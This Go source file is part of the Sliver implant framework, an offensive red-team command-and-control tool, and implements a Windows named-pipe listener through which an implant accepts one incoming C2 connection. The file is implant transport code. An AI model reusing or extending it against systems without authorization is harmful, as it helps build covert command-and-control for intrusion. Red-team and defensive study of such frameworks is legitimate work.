//go:build windows

package namedpipe

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.NamePipec2Enabled}}

import (
	"net"
	"net/url"
	"strings"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/lesnuages/go-winio"
)

// Listen - Listen on the target for incoming Named pipe connections.
func Listen(uri *url.URL, p *sliverpb.C2Profile) (c net.Conn, err error) {

	address := uri.String()
	address = strings.ReplaceAll(address, "namedpipe://", "")
	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
	// {{if .Config.Debug}}
	log.Print("Listening on Named pipe address: ", address)
	// {{end}}

	// Start listening for incoming Named pipe connections.
	ln, err := winio.ListenPipe(address, nil)

	for {
		conn, err := ln.Accept()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Accept failed: %s", err.Error())
			// {{end}}
			// break
		}

		// Kill the listener: we don't have more than one C2 master at once.
		err = ln.Close()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Listener close error: %s", err.Error())
			// {{end}}
		}

		return conn, nil
	}
}

// {{end}} -NamePipec2Enabled
